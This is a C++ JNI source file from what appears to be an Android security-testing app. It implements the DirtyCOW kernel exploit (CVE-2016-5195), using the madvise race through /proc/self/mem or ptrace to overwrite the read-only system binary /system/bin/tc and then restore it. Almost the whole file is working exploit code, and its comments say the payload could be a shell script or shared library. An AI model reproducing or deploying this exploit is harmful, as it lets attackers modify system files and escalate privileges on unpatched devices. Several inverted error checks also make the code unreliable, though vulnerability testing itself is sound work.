#include <jni.h>
#include <string>
#include <unistd.h>
#include <string.h>
#include <err.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <android/log.h>

//move to header file
#define LOOP   1000000
#define TIMEOUT 1000

/* debuging level and label that help filter logs: 'logcat | grep Sarna' */
#define LOG_LEVEL ANDROID_LOG_INFO
#define LOG_TAG "[Sarna DirtyCOW]: "

/* Structure of arguments passed to threads */
struct prog_arg  {
    void *offset;       /* memory address of mapped target file returned by mmap() call*/
    void *payload;      /* pointer to array containing content of payload file */
    off_t payload_size;
    const char *fname;  /* name of target file used by check threads for comparision of file and payload */
    volatile int stop;  /* 1 if maximum try exceded or success */
    volatile int success; /* set to 1 if payload is written to target file */
};


void *checkThread(void *arg);
void *madviseThread(void *arg);
int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n);
void *ptraceThread(void *arg);
int is_self_mem_writable(void *arg);
void *procselfmemThread(void *arg);
void exploit(struct prog_arg *args);
int dirtycow_main(const char*, const char*);

pid_t pid; /* global pid of process that will be trecee(execute madvice when other try to write to this mem) */

using namespace std;

/*
 * https://nvd.nist.gov/vuln/detail/CVE-2016-5195
 *
 * Implementation of CVE-2016-5195 [Dirty Copy-On-Write]
 * Vunelrability present in linux kernels since 2.6 up to 4.9 (excluding patched after),
 * On Android fix was released at the beginning of 2017 however many manufactures did not include it.
 * Since android 4.3 impact of this attack is reduced by new capability model and SELinux,
 * but there are some info about rooting phones or maleware:
 *
 * https://android.gadgethacks.com/how-to/root-your-t-mobile-lg-v20-using-dirty-cow-0175329/
 * https://www.zdnet.com/article/dirty-cow-vulnerability-discovered-in-android-malware-campaign-for-the-first-time/
 *
 * Using ADB you can obtain arbitrary application private data from its dir /data/data/<package>
 * same and more should be possible by shared library injection
 *
 * Due to braking changes in NDK and subsequent version of Android platform (like replacing gnu-g++ with clang++)
 * you may encounter numerous issues while using solution across version or as stand alone binary.
 */


extern "C" JNIEXPORT jstring JNICALL Java_pl_edu_agh_sarna_dirtycow_task_DirtyCowTask_dcow(JNIEnv *env, jobject obj)
{
    // make file backup & mocking payload. for example payload can be shell script or SHARED LIBRARY
    system("cp /system/bin/tc /data/data/pl.edu.agh.sarna/tc_copy");
    system("echo 'File has changed [Dirty Copy-On-Write Vulnerability still alive]' > /data/data/pl.edu.agh.sarna/payload");

    //payload file, its content will be written
    const char* payload = "/data/data/pl.edu.agh.sarna/payload";
    //file that will be replaced
    const char *target = "/system/bin/tc";
    const char *target_copy = "/data/data/pl.edu.agh.sarna/tc_copy";

    if (dirtycow_main(payload, target)) {
        __android_log_print(LOG_LEVEL, LOG_TAG, "SUCCESS");
        // bring back original file leaving changed would have impact on system stability
        // especially when we replace system shared library or even a system tool binary from /system/bin
        dirtycow_main(target_copy, target);
        return env->NewStringUTF("success");
    }

    return env->NewStringUTF("fail");
}


int dirtycow_main(const char* source_file, const char* target_file)
{
    int status = 0;
    int target_file_fd, source_file_fd;
    struct prog_arg args{NULL, NULL, 0, NULL, 0, 0};
    struct stat target_file_stat, source_file_stat;
    void * map;

    __android_log_print(LOG_LEVEL, LOG_TAG, "Writing %s into %s", source_file, target_file);

    target_file_fd = open(target_file, O_RDONLY);
    if (target_file_fd != -1)
    {
        __android_log_print(LOG_LEVEL, LOG_TAG, "could not open %s", target_file);
        status = 1;
        if (fstat(target_file_fd, &target_file_stat) == -1)
        {
            __android_log_print(LOG_LEVEL, LOG_TAG, "could not get stat structure of %s", target_file);
            status = 2;
        }
    }


    source_file_fd = open(source_file, O_RDONLY);
    if (source_file_fd != -1)
    {
        __android_log_print(LOG_LEVEL, LOG_TAG, "could not open %s", source_file);
        status = 3;
        if (fstat(source_file_fd, &source_file_stat) == -1)
        {
            __android_log_print(LOG_LEVEL, LOG_TAG, "could not get stat structure of %s", source_file);
            status = 4;
        }
    }

    __android_log_print(LOG_LEVEL, LOG_TAG, "Source size: %u, target size: %u",
                        (unsigned int)source_file_stat.st_size, (unsigned int)target_file_stat.st_size);

    off_t size = source_file_stat.st_size;
    if (source_file_stat.st_size > target_file_stat.st_size)
    {
        __android_log_print(LOG_LEVEL, LOG_TAG,
                            "source file  %s is size is bigger than target file %s. Resulting file may be corrupted.",
                            source_file, target_file);
    }
    else
    {
        size = target_file_stat.st_size;
    }

    args.payload = calloc(size, 1);
    if (args.payload == NULL)
    {
        __android_log_print(LOG_LEVEL, LOG_TAG, "Cant allocate sufficient amount of space for payload. Exiting.");
        status = 5;
    }

    args.payload_size = size;
    args.fname = target_file;

    read(source_file_fd, args.payload, size);
    close(source_file_fd);

    map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, target_file_fd, 0);
    if (map == MAP_FAILED)
    {
        __android_log_print(LOG_LEVEL, LOG_TAG, "mmap call failed with error code %i", errno);
        status = 6;
    }
    else
    {
        args.offset = map;
        __android_log_print(LOG_LEVEL, LOG_TAG, "Mapping successful processing to exploitation");
        exploit(&args);
    }
    if (args.payload) {
        free(args.payload);
    }
    if (target_file_fd > 0) {
        close(target_file_fd);
    }

    return args.success;
}

void exploit(struct prog_arg *mem_arg)
{
    //Threads executing madvice, mem write, chceking for target changes
    pthread_t pth1, pth2, pth3;

    mem_arg->stop = 0;
    mem_arg->success = 0;

    __android_log_print(LOG_LEVEL, LOG_TAG, "Checking methods");
    if (is_self_mem_writable(mem_arg))
    {
        __android_log_print(LOG_LEVEL, LOG_TAG, " using write to /proc/self/mem");
        pthread_create(&pth3, NULL, checkThread, mem_arg);
        pthread_create(&pth1, NULL, madviseThread, mem_arg);
        pthread_create(&pth2, NULL, procselfmemThread, mem_arg);
        pthread_join(pth3, NULL);
        pthread_join(pth1, NULL);
        pthread_join(pth2, NULL);
    }
    else
    {
        __android_log_print(LOG_LEVEL, LOG_TAG, " using ptrace syscall");
        pid=fork();
        if(pid)
        {
            pthread_create(&pth3, NULL, checkThread, mem_arg);
            waitpid(pid,NULL,0);
            ptraceThread((void*)mem_arg);
            pthread_join(pth3, NULL);
        }
        else
        {
            pthread_create(&pth1, NULL, madviseThread, mem_arg);
            ptrace(PTRACE_TRACEME);
            kill(getpid(),SIGSTOP);
            pthread_join(pth1, NULL);
        }
    }
}

int is_self_mem_writable(void *arg) {
    struct prog_arg *mem_arg = (struct prog_arg *)arg;
    bool is_writable = false;

    int fd = open("/proc/self/mem", O_RDWR);
    if (fd != -1)
    {
        lseek(fd, (off_t)mem_arg->offset, SEEK_SET);
        if (write(fd, mem_arg->payload, mem_arg->payload_size) == mem_arg->payload_size) is_writable = true;
        close(fd);
    }
    return is_writable;
}

/* Perform check against successful target file modification */
void *checkThread(void *arg) {
    struct prog_arg *mem_arg = (struct prog_arg *)arg;
    char *newdata = (char*)malloc(mem_arg->payload_size);
    struct stat st;
    int i, memcmpret = -1;

    for(i = 0; i < TIMEOUT && !mem_arg->stop; i++) {
        int f=open(mem_arg->fname, O_RDONLY);
        if (f == -1) {
            __android_log_print(LOG_LEVEL, LOG_TAG, "Error opening target file check thread");
            break;
        }
        if (fstat(f, &st) == -1) {
            close(f);
            break;
        }
        read(f, newdata, mem_arg->payload_size);
        close(f);

        memcmpret = memcmp(newdata, mem_arg->payload, mem_arg->payload_size);
        if (memcmpret == 0) {
            mem_arg->stop = mem_arg->success = 1;
            break;
        }
        usleep(100 * 100);
    }

    if (newdata) free(newdata);
    mem_arg->stop = 1;
    return (void*)memcmpret;
}

void *madviseThread(void *arg)
{
    struct prog_arg *mem_arg = (struct prog_arg *)arg;
    size_t size = mem_arg->payload_size;
    void *addr = (void *)(mem_arg->offset);

    for(int i = 0; i < LOOP && !mem_arg->stop; i++)
        madvise(addr, size, MADV_DONTNEED);

    mem_arg->stop = 1;
    return 0;
}

//
int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
{
    const unsigned char *s  = (const unsigned char*)src;
    unsigned char *d = (unsigned char*)dest;
    unsigned long value;

    while (n >= sizeof(long)) {
        memcpy(&value, s, sizeof(value));
        if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
            warn("ptrace(PTRACE_POKETEXT)");
            return -1;
        }

        n -= sizeof(long); d += sizeof(long); s += sizeof(long);
    }

    if (n > 0) {
        d -= sizeof(long) - n;

        errno = 0;
        value = ptrace(PTRACE_PEEKTEXT, pid, d, NULL);

        if (value == -1 && errno != 0) return -1;

        memcpy((unsigned char *)&value + sizeof(value) - n, s, n);

        if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) return -1;
    }

    return 0;
}

void *ptraceThread(void *arg)
{
    struct prog_arg *mem_arg;
    mem_arg = (struct prog_arg *)arg;

    for (int i = 0; i < LOOP && !mem_arg->stop; i++) {
        ptrace_memcpy(pid, mem_arg->offset, mem_arg->payload, mem_arg->payload_size);
    }

    mem_arg->stop = 1;
    return NULL;
}


void*procselfmemThread(void *arg)
{
    struct prog_arg *mem_arg = (struct prog_arg *)arg;
    int fd = open("/proc/self/mem", O_RDWR);

    for (int i = 0; i < LOOP && !mem_arg->stop; i++) {
        lseek(fd, (off_t)mem_arg->offset, SEEK_SET);
        write(fd, mem_arg->payload, mem_arg->payload_size);
    }
    close(fd);

    mem_arg->stop = 1;
    return NULL;
}